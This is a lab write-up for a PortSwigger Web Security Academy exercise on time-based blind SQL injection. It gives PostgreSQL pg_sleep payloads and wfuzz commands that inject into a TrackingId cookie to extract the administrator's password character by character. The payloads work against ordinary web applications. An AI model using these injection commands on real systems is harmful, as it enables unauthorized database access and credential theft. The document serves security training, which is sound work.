# Blind SQL injection with time delays and information retrieval
[Click here to see the description of the lab.](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
## Description:
This challenge is about Blind SQL injection based on Time delay. Blind SQL injection doesn't return a response containing the results of the query or any database errors, but it can change some content on the web page, or send an error status code as an HTTP response, in this case neither case is met. To solve this challenge, we rely on the time the query took to be executed, normal time means a condition is not met, more time means a condition is met.
## Writeup:
The challenge's description reveals that the **session cookie** is vulnerable, and we can use it to retrieve the `password` of the `administrator` from the `users` table.
We can use BurpSuite to intercept the request and take a look at the cookie:
![Screenshot from 2024-12-17 16-48-08](https://github.com/user-attachments/assets/24afbb04-d5b1-4d12-a52b-5142cd8b8d02)
We can verify that it is a time based sql injection by sending this payload (we suppose that is it a PostgresSQL database) at the end of the TrackiId cookie:
```sql
'|| pg_sleep(5)--
```
The response was delayed, so the query works.
Since we can't see the result of  the query injected, and we want to extract the password of the administrator, we can make a delay if the first character of the password equals 'a', the payload should look similar to this:
```sql
'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND substr(password, 1, 1)='a'--
```
If the condition was correct, the query will be delayed by 5 seconds, and we now know the first character of the password. Following this method manually is impossible since the password can be any length and contain any character, Wfuzz tool can help us.
You can inject a range of numbers, list of words or characters in your payload by writing FUZZ in the chosen injection point, and with the following command we can know the length of the password:
```sh
wfuzz -c -z range,0-30 -H "Cookie: TrackingId=zJ1zKcy39v1HQPaY'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND LENGTH(password)=FUZZ)--; session=zgorPVqzeSjnbS5aGVnU7BaAjYjT022D" -u "https://0a4200b7042a32e28467c84d00a100aa.web-security-academy.net/" --filter "r.reqtime>=4"
```
The option `--filter r.reqtime>=4` helps us filter the response that took more than 5 seconds, which means the condition is true.
And the result was:
![Screenshot from 2024-12-17 17-00-12](https://github.com/user-attachments/assets/3cb0ab9b-2a61-4a0c-b3a8-3ce5839b7342)
The password's length is 20, now we can test each index with a set of characters and numbers stored in `ascii.txt` file. The Command would be:
```sh
wfuzz -c -z range,1-20 -z file,/home/kali/Desktop/ascii.txt -H "Cookie: TrackingId=zJ1zKcy39v1HQPaY'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND substr(password, FUZZ, 1)='FUZ2Z')--; session=zgorPVqzeSjnbS5aGVnU7BaAjYjT022D" -u "https://0a4200b7042a32e28467c84d00a100aa.web-security-academy.net/" --filter "r.reqtime>=4"
```
And now we got the admin's password from the database.
![Screenshot from 2024-12-17 17-01-04](https://github.com/user-attachments/assets/297743e3-e402-4c7b-9660-64f26e8e5d76)
